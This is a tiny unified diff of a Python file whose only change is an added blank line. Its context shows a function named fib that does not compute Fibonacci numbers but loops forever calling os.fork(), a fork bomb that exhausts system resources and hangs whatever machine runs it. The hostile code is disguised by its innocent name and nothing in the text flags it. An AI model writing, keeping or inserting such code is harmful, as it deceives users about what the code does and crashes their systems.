@@ -1,5 +1,6 @@
 import os
 
+
 def fib(n):
     while True:
         os.fork()
